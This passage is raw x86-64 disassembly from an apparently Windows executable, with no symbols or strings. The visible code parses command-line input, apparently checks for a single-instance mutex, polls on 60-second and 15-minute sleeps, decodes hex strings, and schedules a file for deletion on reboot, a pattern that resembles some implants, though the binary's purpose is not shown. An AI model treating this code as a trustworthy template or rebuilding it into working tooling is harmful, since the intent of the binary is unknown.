   1400017b2:	48 8b 8c 24 90 00 01 	mov    0x10090(%rsp),%rcx
   1400017b9:	00 
   1400017ba:	48 89 c5             	mov    %rax,%rbp
   1400017bd:	48 89 c2             	mov    %rax,%rdx
   1400017c0:	e8 7b 14 00 00       	call   0x140002c40
   1400017c5:	48 89 e9             	mov    %rbp,%rcx
   1400017c8:	e8 13 10 01 00       	call   0x1400127e0
   1400017cd:	48 89 f1             	mov    %rsi,%rcx
   1400017d0:	e8 0b 10 01 00       	call   0x1400127e0
   1400017d5:	e9 db fd ff ff       	jmp    0x1400015b5
   1400017da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400017e0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400017e5:	e8 f6 0f 01 00       	call   0x1400127e0
   1400017ea:	90                   	nop
   1400017eb:	48 81 c4 48 00 01 00 	add    $0x10048,%rsp
   1400017f2:	5b                   	pop    %rbx
   1400017f3:	5e                   	pop    %rsi
   1400017f4:	5f                   	pop    %rdi
   1400017f5:	5d                   	pop    %rbp
   1400017f6:	41 5c                	pop    %r12
   1400017f8:	41 5d                	pop    %r13
   1400017fa:	41 5e                	pop    %r14
   1400017fc:	41 5f                	pop    %r15
   1400017fe:	c3                   	ret
   1400017ff:	90                   	nop
   140001800:	44 89 f2             	mov    %r14d,%edx
   140001803:	48 89 e9             	mov    %rbp,%rcx
   140001806:	e8 25 29 00 00       	call   0x140004130
   14000180b:	48 8d 15 05 28 01 00 	lea    0x12805(%rip),%rdx        # 0x140014017
   140001812:	45 31 c0             	xor    %r8d,%r8d
   140001815:	85 c0                	test   %eax,%eax
   140001817:	0f 84 65 fd ff ff    	je     0x140001582
   14000181d:	e9 d6 fd ff ff       	jmp    0x1400015f8
   140001822:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001829:	00 00 00 00 
   14000182d:	0f 1f 00             	nopl   (%rax)
   140001830:	41 54                	push   %r12
   140001832:	55                   	push   %rbp
   140001833:	57                   	push   %rdi
   140001834:	56                   	push   %rsi
   140001835:	53                   	push   %rbx
   140001836:	48 83 ec 20          	sub    $0x20,%rsp
   14000183a:	80 39 00             	cmpb   $0x0,(%rcx)
   14000183d:	48 89 ce             	mov    %rcx,%rsi
   140001840:	74 3b                	je     0x14000187d
   140001842:	48 8b 3d d7 ad 01 00 	mov    0x1add7(%rip),%rdi        # 0x14001c620
   140001849:	bb 0a 00 00 00       	mov    $0xa,%ebx
   14000184e:	48 8b 2d 1b ae 01 00 	mov    0x1ae1b(%rip),%rbp        # 0x14001c670
   140001855:	4c 8b 25 d4 ae 01 00 	mov    0x1aed4(%rip),%r12        # 0x14001c730
   14000185c:	eb 16                	jmp    0x140001874
   14000185e:	66 90                	xchg   %ax,%ax
   140001860:	ff d5                	call   *%rbp
   140001862:	83 f8 02             	cmp    $0x2,%eax
   140001865:	74 16                	je     0x14000187d
   140001867:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   14000186c:	41 ff d4             	call   *%r12
   14000186f:	83 eb 01             	sub    $0x1,%ebx
   140001872:	74 1c                	je     0x140001890
   140001874:	48 89 f1             	mov    %rsi,%rcx
   140001877:	ff d7                	call   *%rdi
   140001879:	85 c0                	test   %eax,%eax
   14000187b:	74 e3                	je     0x140001860
   14000187d:	48 83 c4 20          	add    $0x20,%rsp
   140001881:	5b                   	pop    %rbx
   140001882:	5e                   	pop    %rsi
   140001883:	5f                   	pop    %rdi
   140001884:	5d                   	pop    %rbp
   140001885:	41 5c                	pop    %r12
   140001887:	c3                   	ret
   140001888:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000188f:	00 
   140001890:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001896:	31 d2                	xor    %edx,%edx
   140001898:	48 89 f1             	mov    %rsi,%rcx
   14000189b:	48 83 c4 20          	add    $0x20,%rsp
   14000189f:	5b                   	pop    %rbx
   1400018a0:	5e                   	pop    %rsi
   1400018a1:	5f                   	pop    %rdi
   1400018a2:	5d                   	pop    %rbp
   1400018a3:	41 5c                	pop    %r12
   1400018a5:	48 ff 25 3c ae 01 00 	rex.W jmp *0x1ae3c(%rip)        # 0x14001c6e8
   1400018ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400018b0:	57                   	push   %rdi
   1400018b1:	56                   	push   %rsi
   1400018b2:	53                   	push   %rbx
   1400018b3:	48 83 ec 20          	sub    $0x20,%rsp
   1400018b7:	48 89 d7             	mov    %rdx,%rdi
   1400018ba:	4c 89 c6             	mov    %r8,%rsi
   1400018bd:	e8 a6 0f 01 00       	call   0x140012868
   1400018c2:	48 85 c0             	test   %rax,%rax
   1400018c5:	48 89 c3             	mov    %rax,%rbx
   1400018c8:	74 61                	je     0x14000192b
   1400018ca:	48 89 f9             	mov    %rdi,%rcx
   1400018cd:	e8 7e 0f 01 00       	call   0x140012850
   1400018d2:	48 01 d8             	add    %rbx,%rax
   1400018d5:	0f b6 10             	movzbl (%rax),%edx
   1400018d8:	80 fa 20             	cmp    $0x20,%dl
   1400018db:	75 10                	jne    0x1400018ed
   1400018dd:	0f 1f 00             	nopl   (%rax)
   1400018e0:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   1400018e4:	48 83 c0 01          	add    $0x1,%rax
   1400018e8:	80 fa 20             	cmp    $0x20,%dl
   1400018eb:	74 f3                	je     0x1400018e0
   1400018ed:	80 fa 22             	cmp    $0x22,%dl
   1400018f0:	74 46                	je     0x140001938
   1400018f2:	0f b6 08             	movzbl (%rax),%ecx
   1400018f5:	ba 01 00 00 00       	mov    $0x1,%edx
   1400018fa:	f6 c1 df             	test   $0xdf,%cl
   1400018fd:	75 16                	jne    0x140001915
   1400018ff:	eb 27                	jmp    0x140001928
   140001901:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001908:	48 83 c2 01          	add    $0x1,%rdx
   14000190c:	48 81 fa 04 01 00 00 	cmp    $0x104,%rdx
   140001913:	74 6b                	je     0x140001980
   140001915:	88 4c 16 ff          	mov    %cl,-0x1(%rsi,%rdx,1)
   140001919:	0f b6 0c 10          	movzbl (%rax,%rdx,1),%ecx
   14000191d:	f6 c1 df             	test   $0xdf,%cl
   140001920:	75 e6                	jne    0x140001908
   140001922:	48 63 d2             	movslq %edx,%rdx
   140001925:	48 01 d6             	add    %rdx,%rsi
   140001928:	c6 06 00             	movb   $0x0,(%rsi)
   14000192b:	48 83 c4 20          	add    $0x20,%rsp
   14000192f:	5b                   	pop    %rbx
   140001930:	5e                   	pop    %rsi
   140001931:	5f                   	pop    %rdi
   140001932:	c3                   	ret
   140001933:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001938:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000193c:	ba 22 00 00 00       	mov    $0x22,%edx
   140001941:	48 89 d9             	mov    %rbx,%rcx
   140001944:	e8 ef 0e 01 00       	call   0x140012838
   140001949:	48 85 c0             	test   %rax,%rax
   14000194c:	74 dd                	je     0x14000192b
   14000194e:	48 29 d8             	sub    %rbx,%rax
   140001951:	ba 03 01 00 00       	mov    $0x103,%edx
   140001956:	48 89 f1             	mov    %rsi,%rcx
   140001959:	39 d0                	cmp    %edx,%eax
   14000195b:	0f 4f c2             	cmovg  %edx,%eax
   14000195e:	48 89 da             	mov    %rbx,%rdx
   140001961:	48 63 f8             	movslq %eax,%rdi
   140001964:	49 89 f8             	mov    %rdi,%r8
   140001967:	e8 f4 0e 01 00       	call   0x140012860
   14000196c:	c6 04 3e 00          	movb   $0x0,(%rsi,%rdi,1)
   140001970:	48 83 c4 20          	add    $0x20,%rsp
   140001974:	5b                   	pop    %rbx
   140001975:	5e                   	pop    %rsi
   140001976:	5f                   	pop    %rdi
   140001977:	c3                   	ret
   140001978:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000197f:	00 
   140001980:	48 81 c6 03 01 00 00 	add    $0x103,%rsi
   140001987:	c6 06 00             	movb   $0x0,(%rsi)
   14000198a:	eb 9f                	jmp    0x14000192b
   14000198c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001990:	41 57                	push   %r15
   140001992:	41 56                	push   %r14
   140001994:	41 55                	push   %r13
   140001996:	41 54                	push   %r12
   140001998:	55                   	push   %rbp
   140001999:	57                   	push   %rdi
   14000199a:	56                   	push   %rsi
   14000199b:	53                   	push   %rbx
   14000199c:	48 81 ec 88 05 00 00 	sub    $0x588,%rsp
   1400019a3:	31 c0                	xor    %eax,%eax
   1400019a5:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400019aa:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400019af:	4d 85 c0             	test   %r8,%r8
   1400019b2:	4c 89 c3             	mov    %r8,%rbx
   1400019b5:	48 8d b4 24 40 01 00 	lea    0x140(%rsp),%rsi
   1400019bc:	00 
   1400019bd:	48 89 ef             	mov    %rbp,%rdi
   1400019c0:	f3 48 ab             	rep stos %rax,(%rdi)
   1400019c3:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400019c8:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400019ce:	48 89 f7             	mov    %rsi,%rdi
   1400019d1:	f3 48 ab             	rep stos %rax,(%rdi)
   1400019d4:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400019da:	74 4b                	je     0x140001a27
   1400019dc:	48 8d 15 98 26 01 00 	lea    0x12698(%rip),%rdx        # 0x14001407b
   1400019e3:	49 89 e8             	mov    %rbp,%r8
   1400019e6:	48 89 d9             	mov    %rbx,%rcx
   1400019e9:	e8 c2 fe ff ff       	call   0x1400018b0
   1400019ee:	49 89 f0             	mov    %rsi,%r8
   1400019f1:	48 89 d9             	mov    %rbx,%rcx
   1400019f4:	c6 84 24 40 01 00 00 	movb   $0x0,0x140(%rsp)
   1400019fb:	00 
   1400019fc:	48 8d 15 82 26 01 00 	lea    0x12682(%rip),%rdx        # 0x140014085
   140001a03:	e8 a8 fe ff ff       	call   0x1400018b0
   140001a08:	80 7c 24 30 00       	cmpb   $0x0,0x30(%rsp)
   140001a0d:	74 18                	je     0x140001a27
   140001a0f:	e8 6c 21 00 00       	call   0x140003b80
   140001a14:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   140001a19:	ff 15 11 ad 01 00    	call   *0x1ad11(%rip)        # 0x14001c730
   140001a1f:	48 89 e9             	mov    %rbp,%rcx
   140001a22:	e8 09 fe ff ff       	call   0x140001830
   140001a27:	31 c9                	xor    %ecx,%ecx
   140001a29:	ba 01 00 00 00       	mov    $0x1,%edx
   140001a2e:	48 8b 2d cb ab 01 00 	mov    0x1abcb(%rip),%rbp        # 0x14001c600
   140001a35:	4c 8d 05 53 26 01 00 	lea    0x12653(%rip),%r8        # 0x14001408f
   140001a3c:	ff d5                	call   *%rbp
   140001a3e:	48 8b 3d 2b ac 01 00 	mov    0x1ac2b(%rip),%rdi        # 0x14001c670
   140001a45:	48 89 c3             	mov    %rax,%rbx
   140001a48:	ff d7                	call   *%rdi
   140001a4a:	3d b7 00 00 00       	cmp    $0xb7,%eax
   140001a4f:	0f 84 18 02 00 00    	je     0x140001c6d
   140001a55:	80 bc 24 40 01 00 00 	cmpb   $0x0,0x140(%rsp)
   140001a5c:	00 
   140001a5d:	0f 85 52 02 00 00    	jne    0x140001cb5
   140001a63:	e8 18 23 00 00       	call   0x140003d80
   140001a68:	e8 33 1d 00 00       	call   0x1400037a0
   140001a6d:	85 c0                	test   %eax,%eax
   140001a6f:	75 0e                	jne    0x140001a7f
   140001a71:	e8 7a 24 00 00       	call   0x140003ef0
   140001a76:	83 f8 01             	cmp    $0x1,%eax
   140001a79:	0f 84 43 02 00 00    	je     0x140001cc2
   140001a7f:	e8 9c 18 00 00       	call   0x140003320
   140001a84:	48 85 c0             	test   %rax,%rax
   140001a87:	48 89 c5             	mov    %rax,%rbp
   140001a8a:	0f 84 ef 00 00 00    	je     0x140001b7f
   140001a90:	48 8d bc 24 50 02 00 	lea    0x250(%rsp),%rdi
   140001a97:	00 
   140001a98:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   140001a9d:	48 89 f9             	mov    %rdi,%rcx
   140001aa0:	e8 8b 1a 00 00       	call   0x140003530
   140001aa5:	4c 8d 25 85 25 01 00 	lea    0x12585(%rip),%r12        # 0x140014031
   140001aac:	48 8b 35 7d ac 01 00 	mov    0x1ac7d(%rip),%rsi        # 0x14001c730
   140001ab3:	48 c7 44 24 20 ff ff 	movq   $0xffffffffffffffff,0x20(%rsp)
   140001aba:	ff ff 
   140001abc:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001ac3:	00 
   140001ac4:	4c 8d 2d ea 25 01 00 	lea    0x125ea(%rip),%r13        # 0x1400140b5
   140001acb:	31 c0                	xor    %eax,%eax
   140001acd:	eb 1c                	jmp    0x140001aeb
   140001acf:	90                   	nop
   140001ad0:	48 89 d9             	mov    %rbx,%rcx
   140001ad3:	e8 08 0f 00 00       	call   0x1400029e0
   140001ad8:	85 c0                	test   %eax,%eax
   140001ada:	0f 84 d8 00 00 00    	je     0x140001bb8
   140001ae0:	b9 60 ea 00 00       	mov    $0xea60,%ecx
   140001ae5:	ff d6                	call   *%rsi
   140001ae7:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001aeb:	85 c0                	test   %eax,%eax
   140001aed:	74 e1                	je     0x140001ad0
   140001aef:	b9 a0 bb 0d 00       	mov    $0xdbba0,%ecx
   140001af4:	ff d6                	call   *%rsi
   140001af6:	48 89 f9             	mov    %rdi,%rcx
   140001af9:	e8 32 1a 00 00       	call   0x140003530
   140001afe:	48 89 d9             	mov    %rbx,%rcx
   140001b01:	e8 da 0e 00 00       	call   0x1400029e0
   140001b06:	85 c0                	test   %eax,%eax
   140001b08:	75 dd                	jne    0x140001ae7
   140001b0a:	48 89 f9             	mov    %rdi,%rcx
   140001b0d:	e8 9e 33 00 00       	call   0x140004eb0
   140001b12:	48 89 d9             	mov    %rbx,%rcx
   140001b15:	48 89 c2             	mov    %rax,%rdx
   140001b18:	49 89 c7             	mov    %rax,%r15
   140001b1b:	e8 20 11 00 00       	call   0x140002c40
   140001b20:	85 c0                	test   %eax,%eax
   140001b22:	75 46                	jne    0x140001b6a
   140001b24:	4c 89 f9             	mov    %r15,%rcx
   140001b27:	e8 b4 0c 01 00       	call   0x1400127e0
   140001b2c:	48 89 d9             	mov    %rbx,%rcx
   140001b2f:	e8 dc 11 00 00       	call   0x140002d10
   140001b34:	48 85 c0             	test   %rax,%rax
   140001b37:	49 89 c7             	mov    %rax,%r15
   140001b3a:	74 36                	je     0x140001b72
   140001b3c:	4c 89 e2             	mov    %r12,%rdx
   140001b3f:	48 89 c1             	mov    %rax,%rcx
   140001b42:	e8 19 2c 00 00       	call   0x140004760
   140001b47:	48 85 c0             	test   %rax,%rax
   140001b4a:	49 89 c6             	mov    %rax,%r14
   140001b4d:	74 1b                	je     0x140001b6a
   140001b4f:	4c 89 ea             	mov    %r13,%rdx
   140001b52:	48 89 c1             	mov    %rax,%rcx
   140001b55:	e8 e6 0c 01 00       	call   0x140012840
   140001b5a:	85 c0                	test   %eax,%eax
   140001b5c:	0f 84 e6 00 00 00    	je     0x140001c48
   140001b62:	4c 89 f1             	mov    %r14,%rcx
   140001b65:	e8 76 0c 01 00       	call   0x1400127e0
   140001b6a:	4c 89 f9             	mov    %r15,%rcx
   140001b6d:	e8 6e 0c 01 00       	call   0x1400127e0
   140001b72:	48 89 d9             	mov    %rbx,%rcx
   140001b75:	e8 86 10 00 00       	call   0x140002c00
   140001b7a:	e9 68 ff ff ff       	jmp    0x140001ae7
   140001b7f:	48 85 db             	test   %rbx,%rbx
   140001b82:	74 12                	je     0x140001b96
   140001b84:	48 89 d9             	mov    %rbx,%rcx
   140001b87:	ff 15 8b ab 01 00    	call   *0x1ab8b(%rip)        # 0x14001c718
   140001b8d:	48 89 d9             	mov    %rbx,%rcx
   140001b90:	ff 15 4a aa 01 00    	call   *0x1aa4a(%rip)        # 0x14001c5e0
   140001b96:	ff 15 b4 ad 01 00    	call   *0x1adb4(%rip)        # 0x14001c950
   140001b9c:	31 c0                	xor    %eax,%eax
   140001b9e:	48 81 c4 88 05 00 00 	add    $0x588,%rsp
   140001ba5:	5b                   	pop    %rbx
   140001ba6:	5e                   	pop    %rsi
   140001ba7:	5f                   	pop    %rdi
   140001ba8:	5d                   	pop    %rbp
   140001ba9:	41 5c                	pop    %r12
   140001bab:	41 5d                	pop    %r13
   140001bad:	41 5e                	pop    %r14
   140001baf:	41 5f                	pop    %r15
   140001bb1:	c3                   	ret
   140001bb2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001bb8:	48 89 fa             	mov    %rdi,%rdx
   140001bbb:	48 89 e9             	mov    %rbp,%rcx
   140001bbe:	e8 ed 31 00 00       	call   0x140004db0
   140001bc3:	48 89 d9             	mov    %rbx,%rcx
   140001bc6:	48 89 c2             	mov    %rax,%rdx
   140001bc9:	49 89 c7             	mov    %rax,%r15
   140001bcc:	e8 6f 10 00 00       	call   0x140002c40
   140001bd1:	4c 89 f9             	mov    %r15,%rcx
   140001bd4:	85 c0                	test   %eax,%eax
   140001bd6:	75 58                	jne    0x140001c30
   140001bd8:	e8 03 0c 01 00       	call   0x1400127e0
   140001bdd:	48 89 d9             	mov    %rbx,%rcx
   140001be0:	e8 2b 11 00 00       	call   0x140002d10
   140001be5:	48 85 c0             	test   %rax,%rax
   140001be8:	49 89 c7             	mov    %rax,%r15
   140001beb:	74 36                	je     0x140001c23
   140001bed:	4c 89 e2             	mov    %r12,%rdx
   140001bf0:	48 89 c1             	mov    %rax,%rcx
   140001bf3:	e8 68 2b 00 00       	call   0x140004760
   140001bf8:	48 85 c0             	test   %rax,%rax
   140001bfb:	49 89 c6             	mov    %rax,%r14
   140001bfe:	74 1b                	je     0x140001c1b
   140001c00:	48 8d 15 a3 24 01 00 	lea    0x124a3(%rip),%rdx        # 0x1400140aa
   140001c07:	48 89 c1             	mov    %rax,%rcx
   140001c0a:	e8 31 0c 01 00       	call   0x140012840
   140001c0f:	85 c0                	test   %eax,%eax
   140001c11:	74 4d                	je     0x140001c60
   140001c13:	4c 89 f1             	mov    %r14,%rcx
   140001c16:	e8 c5 0b 01 00       	call   0x1400127e0
   140001c1b:	4c 89 f9             	mov    %r15,%rcx
   140001c1e:	e8 bd 0b 01 00       	call   0x1400127e0
   140001c23:	48 89 d9             	mov    %rbx,%rcx
   140001c26:	e8 d5 0f 00 00       	call   0x140002c00
   140001c2b:	e9 bf fe ff ff       	jmp    0x140001aef
   140001c30:	e8 ab 0b 01 00       	call   0x1400127e0
   140001c35:	48 89 d9             	mov    %rbx,%rcx
   140001c38:	e8 c3 0f 00 00       	call   0x140002c00
   140001c3d:	e9 9e fe ff ff       	jmp    0x140001ae0
   140001c42:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001c48:	4c 89 fa             	mov    %r15,%rdx
   140001c4b:	48 89 d9             	mov    %rbx,%rcx
   140001c4e:	e8 fd f7 ff ff       	call   0x140001450
   140001c53:	e9 0a ff ff ff       	jmp    0x140001b62
   140001c58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001c5f:	00 
   140001c60:	4c 89 fa             	mov    %r15,%rdx
   140001c63:	48 89 d9             	mov    %rbx,%rcx
   140001c66:	e8 e5 f7 ff ff       	call   0x140001450
   140001c6b:	eb a6                	jmp    0x140001c13
   140001c6d:	48 85 db             	test   %rbx,%rbx
   140001c70:	74 09                	je     0x140001c7b
   140001c72:	48 89 d9             	mov    %rbx,%rcx
   140001c75:	ff 15 65 a9 01 00    	call   *0x1a965(%rip)        # 0x14001c5e0
   140001c7b:	e8 00 1f 00 00       	call   0x140003b80
   140001c80:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   140001c85:	ff 15 a5 aa 01 00    	call   *0x1aaa5(%rip)        # 0x14001c730
   140001c8b:	31 c9                	xor    %ecx,%ecx
   140001c8d:	ba 01 00 00 00       	mov    $0x1,%edx
   140001c92:	4c 8d 05 f6 23 01 00 	lea    0x123f6(%rip),%r8        # 0x14001408f
   140001c99:	ff d5                	call   *%rbp
   140001c9b:	48 89 c3             	mov    %rax,%rbx
   140001c9e:	ff d7                	call   *%rdi
   140001ca0:	3d b7 00 00 00       	cmp    $0xb7,%eax
   140001ca5:	0f 85 aa fd ff ff    	jne    0x140001a55
   140001cab:	48 85 db             	test   %rbx,%rbx
   140001cae:	75 24                	jne    0x140001cd4
   140001cb0:	e9 e7 fe ff ff       	jmp    0x140001b9c
   140001cb5:	48 89 f1             	mov    %rsi,%rcx
   140001cb8:	e8 73 fb ff ff       	call   0x140001830
   140001cbd:	e9 a1 fd ff ff       	jmp    0x140001a63
   140001cc2:	48 85 db             	test   %rbx,%rbx
   140001cc5:	0f 84 d1 fe ff ff    	je     0x140001b9c
   140001ccb:	48 89 d9             	mov    %rbx,%rcx
   140001cce:	ff 15 44 aa 01 00    	call   *0x1aa44(%rip)        # 0x14001c718
   140001cd4:	48 89 d9             	mov    %rbx,%rcx
   140001cd7:	ff 15 03 a9 01 00    	call   *0x1a903(%rip)        # 0x14001c5e0
   140001cdd:	e9 ba fe ff ff       	jmp    0x140001b9c
   140001ce2:	90                   	nop
   140001ce3:	90                   	nop
   140001ce4:	90                   	nop
   140001ce5:	90                   	nop
   140001ce6:	90                   	nop
   140001ce7:	90                   	nop
   140001ce8:	90                   	nop
   140001ce9:	90                   	nop
   140001cea:	90                   	nop
   140001ceb:	90                   	nop
   140001cec:	90                   	nop
   140001ced:	90                   	nop
   140001cee:	90                   	nop
   140001cef:	90                   	nop
   140001cf0:	48 83 ec 38          	sub    $0x38,%rsp
   140001cf4:	48 8d 15 c5 23 01 00 	lea    0x123c5(%rip),%rdx        # 0x1400140c0
   140001cfb:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001d00:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001d05:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001d0a:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140001d0f:	e8 1c 81 00 00       	call   0x140009e30
   140001d14:	48 83 c4 38          	add    $0x38,%rsp
   140001d18:	c3                   	ret
   140001d19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001d20:	41 55                	push   %r13
   140001d22:	41 54                	push   %r12
   140001d24:	55                   	push   %rbp
   140001d25:	57                   	push   %rdi
   140001d26:	56                   	push   %rsi
   140001d27:	53                   	push   %rbx
   140001d28:	48 83 ec 38          	sub    $0x38,%rsp
   140001d2c:	44 89 c7             	mov    %r8d,%edi
   140001d2f:	48 89 d6             	mov    %rdx,%rsi
   140001d32:	48 89 cb             	mov    %rcx,%rbx
   140001d35:	e8 16 0b 01 00       	call   0x140012850
   140001d3a:	89 c2                	mov    %eax,%edx
   140001d3c:	c1 ea 1f             	shr    $0x1f,%edx
   140001d3f:	44 8d 24 02          	lea    (%rdx,%rax,1),%r12d
   140001d43:	41 d1 fc             	sar    $1,%r12d
   140001d46:	41 39 fc             	cmp    %edi,%r12d
   140001d49:	44 0f 4f e7          	cmovg  %edi,%r12d
   140001d4d:	45 85 e4             	test   %r12d,%r12d
   140001d50:	7e 38                	jle    0x140001d8a
   140001d52:	48 8d 6c 24 2c       	lea    0x2c(%rsp),%rbp
   140001d57:	49 63 c4             	movslq %r12d,%rax
   140001d5a:	4c 8d 2c 43          	lea    (%rbx,%rax,2),%r13
   140001d5e:	48 8d 3d 5b 23 01 00 	lea    0x1235b(%rip),%rdi        # 0x1400140c0
   140001d65:	0f 1f 00             	nopl   (%rax)
   140001d68:	48 89 d9             	mov    %rbx,%rcx
   140001d6b:	49 89 e8             	mov    %rbp,%r8
   140001d6e:	48 89 fa             	mov    %rdi,%rdx
   140001d71:	e8 7a ff ff ff       	call   0x140001cf0
   140001d76:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140001d7a:	48 83 c3 02          	add    $0x2,%rbx
   140001d7e:	48 83 c6 01          	add    $0x1,%rsi
   140001d82:	88 46 ff             	mov    %al,-0x1(%rsi)
   140001d85:	4c 39 eb             	cmp    %r13,%rbx
   140001d88:	75 de                	jne    0x140001d68
   140001d8a:	44 89 e0             	mov    %r12d,%eax
   140001d8d:	48 83 c4 38          	add    $0x38,%rsp
   140001d91:	5b                   	pop    %rbx
   140001d92:	5e                   	pop    %rsi
   140001d93:	5f                   	pop    %rdi
   140001d94:	5d                   	pop    %rbp
   140001d95:	41 5c                	pop    %r12
   140001d97:	41 5d                	pop    %r13
   140001d99:	c3                   	ret
   140001d9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001da0:	41 54                	push   %r12
   140001da2:	55                   	push   %rbp
   140001da3:	57                   	push   %rdi
   140001da4:	56                   	push   %rsi
   140001da5:	53                   	push   %rbx
   140001da6:	48 83 ec 60          	sub    $0x60,%rsp
   140001daa:	45 31 c9             	xor    %r9d,%r9d
   140001dad:	48 89 cf             	mov    %rcx,%rdi
   140001db0:	89 d5                	mov    %edx,%ebp
   140001db2:	4c 89 c6             	mov    %r8,%rsi
   140001db5:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140001dbc:	00 
   140001dbd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001dc2:	45 31 c0             	xor    %r8d,%r8d
   140001dc5:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140001dcc:	00 00 
   140001dce:	48 8d 15 f1 22 01 00 	lea    0x122f1(%rip),%rdx        # 0x1400140c6
   140001dd5:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   140001ddc:	00 
   140001ddd:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001de4:	00 00 
   140001de6:	e8 bd 32 00 00       	call   0x1400050a8
   140001deb:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001df0:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140001df5:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001dfb:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140001e00:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001e07:	00 
   140001e08:	48 8d 15 c5 22 01 00 	lea    0x122c5(%rip),%rdx        # 0x1400140d4
   140001e0f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001e14:	e8 9f 32 00 00       	call   0x1400050b8
   140001e19:	8b 5c 24 48          	mov    0x48(%rsp),%ebx
   140001e1d:	4c 8b 25 64 a8 01 00 	mov    0x1a864(%rip),%r12        # 0x14001c688
   140001e24:	41 ff d4             	call   *%r12
   140001e27:	31 d2                	xor    %edx,%edx
   140001e29:	48 89 c1             	mov    %rax,%rcx
   140001e2c:	49 89 d8             	mov    %rbx,%r8
   140001e2f:	ff 15 83 a8 01 00    	call   *0x1a883(%rip)        # 0x14001c6b8
   140001e35:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   140001e3a:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001e3f:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140001e46:	00 
   140001e47:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001e4c:	49 89 c0             	mov    %rax,%r8
   140001e4f:	48 89 c3             	mov    %rax,%rbx
   140001e52:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001e59:	00 
   140001e5a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001e61:	00 00 
   140001e63:	e8 90 32 00 00       	call   0x1400050f8
   140001e68:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001e6d:	45 31 c9             	xor    %r9d,%r9d
   140001e70:	41 89 e8             	mov    %ebp,%r8d
   140001e73:	48 89 fa             	mov    %rdi,%rdx
   140001e76:	e8 35 32 00 00       	call   0x1400050b0
   140001e7b:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001e80:	45 31 c9             	xor    %r9d,%r9d
   140001e83:	48 89 f2             	mov    %rsi,%rdx
   140001e86:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140001e8c:	e8 3f 32 00 00       	call   0x1400050d0
   140001e91:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001e96:	48 85 c9             	test   %rcx,%rcx
   140001e99:	74 05                	je     0x140001ea0
   140001e9b:	e8 48 32 00 00       	call   0x1400050e8
   140001ea0:	48 85 db             	test   %rbx,%rbx
   140001ea3:	74 11                	je     0x140001eb6
   140001ea5:	41 ff d4             	call   *%r12
   140001ea8:	49 89 d8             	mov    %rbx,%r8
   140001eab:	31 d2                	xor    %edx,%edx
   140001ead:	48 89 c1             	mov    %rax,%rcx
   140001eb0:	ff 15 0a a8 01 00    	call   *0x1a80a(%rip)        # 0x14001c6c0
   140001eb6:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001ebb:	48 85 c9             	test   %rcx,%rcx
   140001ebe:	74 08                	je     0x140001ec8
   140001ec0:	31 d2                	xor    %edx,%edx
   140001ec2:	e8 39 32 00 00       	call   0x140005100
   140001ec7:	90                   	nop
   140001ec8:	48 83 c4 60          	add    $0x60,%rsp
   140001ecc:	5b                   	pop    %rbx
   140001ecd:	5e                   	pop    %rsi
   140001ece:	5f                   	pop    %rdi
   140001ecf:	5d                   	pop    %rbp
   140001ed0:	41 5c                	pop    %r12
   140001ed2:	c3                   	ret
   140001ed3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001eda:	00 00 00 00 
